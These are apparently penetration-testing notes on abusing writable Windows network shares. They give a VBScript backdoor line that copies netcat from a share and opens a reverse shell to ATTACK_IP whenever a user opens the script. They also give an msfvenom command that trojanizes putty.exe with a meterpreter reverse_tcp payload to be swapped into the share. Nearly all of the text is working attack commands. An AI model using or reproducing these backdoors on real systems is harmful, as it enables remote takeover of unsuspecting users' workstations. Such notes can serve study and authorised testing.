# ABUSING WRITEABLE SHARES

### Find shortcut to a script or executable file hosted on a network share.

# BACKDOORING .vbs SCRIPTS

#### CreateObject("WScript.Shell").

#### Run "cmd.exe /c copy /Y \\TARGET_IP\MYSHARE\nc64.exe %tmp & %tmp\nc64.exe -e cmd.exe ATTACK_IP PORT", O, True

### Copies binary from the share to the user's workstation %tmp directory and send a reverse shell back to attacker whenever a user opens the shared VBS script.

# BACKDOORING .exe FILES

#### 1) Download binary from share

#### 2) 

    msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACK_IP lport=PORT -b "\x00" -f exe -o puttyX.exe

#### 3) Replace file and wait for connections with exploit/multi/handler (metasploit)
